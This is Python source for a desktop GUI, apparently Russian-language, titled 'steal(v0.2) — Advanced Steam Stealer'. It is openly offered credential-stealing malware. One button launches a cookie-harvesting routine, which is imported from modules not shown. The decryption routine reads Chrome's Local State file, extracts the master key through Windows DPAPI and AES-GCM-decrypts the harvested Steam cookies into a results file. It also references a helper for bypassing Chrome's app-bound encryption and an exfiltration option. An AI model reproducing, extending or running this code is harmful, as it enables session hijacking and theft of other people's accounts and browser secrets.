import sys
import os
import json
import base64
import win32crypt
import time
import threading

# PyInstaller Fix
if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
    os.chdir(base_path)
else:
    base_path = os.path.dirname(os.path.abspath(__file__))

import customtkinter as ctk
from datetime import datetime

from core.orchestrator import execute_full_steal

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class StealApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("steal(v0.2) — Advanced Steam Stealer")
        self.geometry("1450x950")
        self.resizable(True, True)
        self.create_ui()

    def create_ui(self):
        title = ctk.CTkLabel(self, text="steal(v0.2)", 
                             font=ctk.CTkFont(size=42, weight="bold"), text_color="#00ffcc")
        title.pack(pady=(40, 5))

        subtitle = ctk.CTkLabel(self, text="Steam Cookies • App-Bound Support • Stealth Mode",
                                font=ctk.CTkFont(size=16), text_color="#aaaaaa")
        subtitle.pack(pady=(0, 30))

        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(pady=30, padx=60, fill="x")

        ctk.CTkButton(btn_frame, text="🚀 Запустить сбор куки",
                      height=65, font=ctk.CTkFont(size=18, weight="bold"),
                      fg_color="#0066ff", hover_color="#0050cc",
                      command=self.start_full_steal).pack(pady=15, padx=40, fill="x")

        ctk.CTkButton(btn_frame, text="🔓 Расшифровать собранные куки",
                      height=55, font=ctk.CTkFont(size=16, weight="bold"),
                      fg_color="#00aa66", hover_color="#008855",
                      command=self.start_decrypt).pack(pady=12, padx=40, fill="x")

        log_frame = ctk.CTkFrame(self)
        log_frame.pack(pady=20, padx=60, fill="both", expand=True)

        self.log_text = ctk.CTkTextbox(log_frame, font=ctk.CTkFont(family="Consolas", size=11))
        self.log_text.pack(padx=15, pady=15, fill="both", expand=True)

        self.status_label = ctk.CTkLabel(self, text="Готов к работе",
                                         font=ctk.CTkFont(size=15), text_color="#00ff88")
        self.status_label.pack(pady=15)

    def log(self, message: str):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert("end", f"[{ts}] {message}\n")
        self.log_text.see("end")
        self.update_idletasks()

    def start_full_steal(self):
        self.log_text.delete("1.0", "end")
        self.log("=== Запуск сбора куки ===")
        threading.Thread(target=self.run_full_steal, daemon=True).start()

    def run_full_steal(self):
        self.status_label.configure(text="Сбор куки...", text_color="#ffaa00")
        execute_full_steal(log_callback=self.log, use_exfil=False)
        self.status_label.configure(text="Сбор завершён ✓", text_color="#00ff88")

    def start_decrypt(self):
        self.log_text.delete("1.0", "end")
        self.log("=== Запуск расшифровки куки ===")
        threading.Thread(target=self.run_decrypt, daemon=True).start()

    def run_decrypt(self):
        self.status_label.configure(text="Расшифровка...", text_color="#ffaa00")
        
        try:
            self.decrypt_cookies()
        except Exception as e:
            self.log(f"❌ Критическая ошибка: {e}")
        
        self.status_label.configure(text="Расшифровка завершена", text_color="#00ff88")

    def decrypt_cookies(self):
        encrypted_file = "results/steam_cookies_encrypted.txt"

        if not os.path.exists(encrypted_file):
            self.log("❌ Файл с зашифрованными куки не найден!")
            self.log("Сначала нажмите '🚀 Запустить сбор куки'")
            return

        # Пытаемся импортировать Cryptodome (из pycryptodomex)
        try:
            from Cryptodome.Cipher import AES
            self.log("✅ Cryptodome загружен")
        except ImportError:
            self.log("❌ Cryptodome не найден в .exe")
            self.log("Расшифровка невозможна")
            return

        # Получаем мастер-ключ Chrome
        local_state = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Local State")
        master_key = None

        try:
            with open(local_state, "r", encoding="utf-8") as f:
                data = json.load(f)
            os_crypt = data.get("os_crypt", {})
            if "encrypted_key" in os_crypt:
                key = base64.b64decode(os_crypt["encrypted_key"])
                if key.startswith(b"DPAPI"):
                    master_key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
                    self.log("✅ Мастер-ключ Chrome получен")
        except Exception as e:
            self.log(f"❌ Не удалось получить мастер-ключ: {e}")
            return

        if not master_key:
            self.log("❌ Мастер-ключ не найден. Закройте Chrome.")
            return

        # Создаём файл с временем
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        output_file = f"results/steam_cookies_decrypted_{timestamp}.txt"
        count = 0

        try:
            with open(encrypted_file, "r", encoding="utf-8") as f, \
                 open(output_file, "w", encoding="utf-8") as out:

                out.write("=== steal(v0.2) — DECRYPTED STEAM COOKIES ===\n")
                out.write(f"Дата расшифровки: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                out.write(f"Время сбора: {timestamp}\n")
                out.write("=" * 80 + "\n\n")

                for line in f:
                    if "Encrypted (base64):" in line:
                        try:
                            b64_value = line.split("Encrypted (base64):", 1)[1].strip()
                            encrypted_value = base64.b64decode(b64_value)

                            if encrypted_value[:3] in (b"v10", b"v11", b"v20"):
                                nonce = encrypted_value[3:15]
                                ciphertext = encrypted_value[15:-16]
                                tag = encrypted_value[-16:]

                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                                decrypted_text = decrypted.decode("utf-8", errors="ignore")

                                out.write(f"Decrypted Value: {decrypted_text}\n")
                                self.log(f"Расшифровано: {decrypted_text[:70]}...")
                                count += 1
                            else:
                                out.write(line)
                        except:
                            out.write(line)
                    else:
                        out.write(line)

            self.log(f"✅ Успешно расшифровано {count} куки!")
            self.log(f"Файл сохранён: {output_file}")

        except Exception as e:
            self.log(f"❌ Ошибка при расшифровке: {e}")

    def run_elevator_only(self):
        self.status_label.configure(text="Запуск ChromElevator...", text_color="#ffaa00")
        from modules.app_bound_helper import run_chromelevator
        run_chromelevator(self.log)
        self.status_label.configure(text="Готов", text_color="#00ff88")


if __name__ == "__main__":
    app = StealApp()
    app.mainloop()